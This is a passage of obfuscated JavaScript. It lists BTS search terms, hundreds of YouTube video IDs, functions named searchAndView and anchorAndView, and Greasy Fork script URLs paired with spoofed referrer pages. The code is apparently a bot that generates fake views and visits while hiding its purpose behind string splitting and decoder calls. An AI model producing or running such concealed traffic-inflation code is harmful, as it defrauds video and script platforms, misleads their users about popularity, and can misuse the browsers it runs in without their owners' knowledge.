'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x15e6 * -0x1 + 0xfa5 + -0x2 * 0x12c4);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    Y(0x16) + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    Z(0x9, '8&uY') + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    Y(0xb) + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    X(0x17) + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': X(0x15) + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': Y(0x4) + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + Z(0x8, 'R*RM')
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + Z(0xa, 'Ycwm') + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + X(0x12) + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + X(0x2) + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + Y(0xe) + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
